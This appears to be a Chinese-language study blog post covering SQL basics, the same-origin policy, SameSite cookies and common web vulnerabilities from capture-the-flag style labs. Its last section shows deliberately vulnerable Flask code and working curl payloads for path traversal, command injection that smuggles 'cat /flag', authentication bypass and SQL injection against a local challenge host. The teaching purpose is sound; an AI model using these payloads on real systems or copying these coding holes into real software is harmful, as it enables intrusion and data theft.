---
layout: post
tags: [web]
title: "SQL & Same-Origin Policy & 常见web漏洞"
date: 2024-7-22
author: wsxk
comments: true
---

- [1. SQL(structured query language)](#1-sqlstructured-query-language)
  - [1.1 CREATE TABLE](#11-create-table)
  - [1.2 DROP TABLE](#12-drop-table)
  - [1.3 INSERT INTO](#13-insert-into)
  - [1.4 SELECT](#14-select)
  - [1.5 DELETE](#15-delete)
  - [1.6 UPDATE](#16-update)
  - [1.7 UNION](#17-union)
  - [1.8 The Schema Table](#18-the-schema-table)
- [2. Same-Origin Policy](#2-same-origin-policy)
  - [2.1 Origin基本概念](#21-origin基本概念)
  - [2.2 Sending HTTP Requests Cross-Origin](#22-sending-http-requests-cross-origin)
  - [2.3 Reading HTTP Responses Cross-Origin](#23-reading-http-responses-cross-origin)
  - [2.4 Domain Name(域名)](#24-domain-name域名)
    - [2.4.1 Top-Level Domain (顶级域名)](#241-top-level-domain-顶级域名)
    - [2.4.2 Effective Top-Level Domain(有效顶级域名)](#242-effective-top-level-domain有效顶级域名)
  - [2.5 Site](#25-site)
  - [2.6 SameSite Cookie Attribute](#26-samesite-cookie-attribute)
- [3. 常见web漏洞](#3-常见web漏洞)
  - [3.1 路径遍历漏洞](#31-路径遍历漏洞)
  - [3.2 命令注入](#32-命令注入)
  - [3.3 身份验证绕过](#33-身份验证绕过)
  - [3.4 SQL注入](#34-sql注入)


## 1. SQL(structured query language)<br>
`sql是一种查询数据的语言`<br>
### 1.1 CREATE TABLE<br>
创建表:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191144.png)

### 1.2 DROP TABLE<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191551.png)

### 1.3 INSERT INTO<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191224.png)

### 1.4 SELECT<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191301.png)


### 1.5 DELETE<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191359.png)

### 1.6 UPDATE<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191429.png)

### 1.7 UNION<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191454.png)

### 1.8 The Schema Table<br>
`The Schema Table`是各个数据库里都有的用来存放`table信息`的`table`<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240722191655.png)

## 2. Same-Origin Policy<br>
同源策略(same-origin policy)是**浏览器最基本、最核心的安全功能**，所以只针对浏览器，这一点要确认好（anyway，你用wget等命令来下载东西的时候只需要随便点点就行了,而浏览器要关注的事情就很多了😀<br>
### 2.1 Origin基本概念<br>

```
书接上回，一个http url scheme的结构如下:
<scheme>://<host>:<port>/<path>?<query>#<fragment>

一个http url来说，其origin为:
(<scheme>, <host>, <port>)
```
判断同源的标准其实是**协议、域名、端口一致**<br>
所以:
```
同源：
http://example.com/				(http, example.com, 80)
http://example.com/cat.gif		(http, example.com, 80) 

不同源：
协议不一致：
http://example.com/				(http, example.com, 80)
https://example.com/				(https, example.com, 80)
域名不一致：
http://example.com/				(http, example.com, 80)
http://cats.example.com/		(http, cats.example.com, 80)
端口不一致：
http://example.com/				(http, example.com, 80)
http://example.com:8080/		(http, example.com, 8080)
```

### 2.2 Sending HTTP Requests Cross-Origin<br>
同源策略之一：`跨域http请求`：<br>
`跨域http请求`通常发生在在浏览器的网页里`http://example.com:80`发送请求到另一个域的服务器(比如`https://api.example.com:443`)的资源时<br>
该请求特点：<br>
```
1、由客户端（浏览器）发起
2、请求可能包括get、post、put、delete等方法
3、涉及跨域访问
4、服务端（服务器）需要配置CORS（cross-origin resource sharing，跨域资源共享）策略,每一个页面需要返回一个名为Access-Control-Allow-Origin的http头来允许外域的站点访问

值得一提的是CORS需要浏览器和服务器同时支持
```
**<br>
简单理解:**服务器的处理请求的方法如果允许跨域访问，都需要在返回响应时设置Access-Control-Allow-Origin来决定允许哪些站点可以访问该请求**<br>

### 2.3 Reading HTTP Responses Cross-Origin<br>
`Reading HTTP Responses Cross-Origin`请求，在`2.2节中，服务器返回http响应后`，**浏览器会根据服务器返回http响应中的Access-Control-Allow-Origin来决定是否读取该响应内容**<br>

### 2.4 Domain Name(域名)<br>
虽然现在介绍域名有点迟，不过还不晚~<br>
直白的说，域名就是**由点号分隔的标签**<br>
如下例子中都是域名:<br>
```
www.example.com
www.google.com
www.google.co.uk
pwn.college
dojo.pwn.college
pwncollege.github.io
```

#### 2.4.1 Top-Level Domain (顶级域名)<br>
一般来说，**顶级域名是域名最右边标签**<br>
以上面的例子来说，顶级域名为<br>
www.example.**com**<br>
www.google.**com**<br>
www.google.co.**uk**<br>
pwn.**college**<br>
dojo.pwn.**college**<br>
pwncollege.github.**io**<br>

#### 2.4.2 Effective Top-Level Domain(有效顶级域名)<br>
[https://publicsuffix.org/list/public_suffix_list.dat](https://publicsuffix.org/list/public_suffix_list.dat)中记录了所有有效顶级域名<br>
之所以要有有效顶级域名，是因为例如`github.io`也被作为顶级域名了。<br>
还有以上面提到为例，有效顶级域名为：<br>
www.example.**com**<br>
www.google.**com**<br>
www.google.**co.uk**<br>
pwn.**college**<br>
dojo.pwn.**college**<br>
pwncollege.**github.io**<br>


### 2.5 Site<br>
`site`其实是`Effective Top-Level Domain +1 `<br>
举例如下：<br>

www.**example.com**<br>
www.**google.com**<br>
www.**google.co.uk**<br>
**pwn.college**<br>
dojo.**pwn.college**<br>
**pwncollege.github.io**<br>


### 2.6 SameSite Cookie Attribute<br>
至于为什么要定义出`site`这个概念，这跟`cookie`是息息相关的，最有名的就是`SameSite Cookie属性了`<br>
众所周知啊，`cookie`是用来维持http状态的（不知道的童鞋请翻阅[https://wsxk.github.io/web_basic/#18-cookie](https://wsxk.github.io/web_basic/#18-cookie)）<br>
简单的说，服务器会用cookie来标识客户端，以提供客户端不同的服务。**通常情况下，一个服务器提供的各种服务都由不同的网址提供，这些网址都会被标识为同一个site（表示同一个服务商提供的服务）**<br>
浏览器会根据是否是同一个site来决定是否在发送请求时带上`cookie`，<br>
简单介绍完cookie后，现在来介绍`samesite cookie attribute`吧，***samesite cookie attribute决定了浏览器在发送跨站(cross site)请求时是否发送本站点cookie***<br>
配置如下:<br>
```
SameSite=None
Cookie is sent in cross-site requests
允许在发送跨站请求时携带本站cookie
这是非常危险的行为，比如你在访问 aaa.example.com的网页时，aaa.example.com 向 bbb.image.com（跨站）请求一张图片时，会发送bbb.image.com在你浏览器中的cookie


SameSite=Lax (default)
Cookie is sent in cross-site top-level navigation GET requests
默认设置，只有在发送跨站的Top-level navigation (顶级导航) 的GET请求时，才会带上cookie
这个场景是在你访问aaa.example.com的网页后，你点击了网页里的bbb.test.com的链接，随后跳转到bbb.test.com（同时浏览器的地址栏url发生了改变），并且请求是GET请求时，才会让发送先前bbb.test.com的cookie

SameSite=Strict
Cookie is not sent in cross-site requests
Strict最为严格，完全禁止第三方 Cookie，当前站点与请求目标站点是跨站关系时，总是不会发送 Cookie。换言之，只有当前站点 与请求目标站点是同站关系时，才会带上 Cookie
```

## 3. 常见web漏洞<br>
### 3.1 路径遍历漏洞<br>
路径遍历漏洞指的是**允许攻击者在未经授权的情况下读取服务器上任意文件的安全漏洞**<br>
例子:<br>
```
# 路径遍历漏洞的参数通常是../../../flag 
curl http://challenge.localhost:80/?path=../flag
```

### 3.2 命令注入<br>
命令注入指的是**攻击者可以控制变量作为命令被执行而导致的安全漏洞**<br>
比如有如下代码:<br>
```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin") # 存在命令注入，timezone为用户可控，可以通过插入UTC cat /flag; 来使整个字符串变为
    # TZ=UTC cat /flag; date
```
可以通过如下命令获得flag<br>
```
 curl http://challenge.localhost:80/?timezone=UTC%20cat%20/flag%3b
```

### 3.3 身份验证绕过<br>
有的人在写代码对身份的校验出现了问题，导致身份验证可以被绕过，攻击者不需要输入密码即可获得用户权限<br>
```python
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))
    
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))
    # 逻辑出现错误，即使不发送post请求验证身份，也可以执行登陆后的执行逻辑。
    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```
只需要发送请求`curl http://challenge.localhost:80/?user=1`即可绕过<br>

### 3.4 SQL注入<br>
`sql注入`发生在攻击者的输入可以影响到sql语句的查询的场景下，<br>

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone() # 存在sql注入
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```
利用方法:<br>
`curl -X POST -d "username=flag%22%20or%20%221%22=%221&password=wsxk" -i -c cookies.txt http://challenge.localhost:80`<br>
发送上述请求后的sql实际展开为`SELECT rowid, * FROM users WHERE username = "flag" or "1"="1" AND password = "wsxk"`<br>
随后发送`curl -b cookies.txt http://challenge.localhost:80`即可获取flag<br>
**SQL注入的攻击模式不止上述一种**<br>
